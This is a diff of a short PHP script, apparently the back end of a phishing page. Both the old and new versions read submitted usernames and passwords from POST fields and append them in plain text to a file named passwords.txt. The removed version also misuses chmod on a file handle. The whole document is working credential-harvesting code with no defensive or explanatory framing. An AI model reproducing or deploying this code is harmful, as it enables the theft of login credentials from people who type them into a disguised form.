@@ -1,11 +1,11 @@
 <?php
 
-    if(isset($_POST['user']) && isset($_POST['pass'])) {
-        $str = 'username: '.$_POST['user'].'password: '.$_POST['pass']. PHP_EOL;
-        $details_file = fopen("passwords.txt", "a");
-        chmod($details_file, 777);
-        fwrite($details_file, $str);
-        fclose($details_file);
-    }
+    $name = $_POST['user'];
+    $pass =  $_POST['pass'];
+    $myfile = fopen("passwords.txt", "a") or die("Unable to open file!");
+    $txt = "username: " . $name . "\t";
+    $txt .= "password: " . $pass . " \n";
+    fwrite($myfile, $txt);
+    fclose($myfile);
 
 ?>
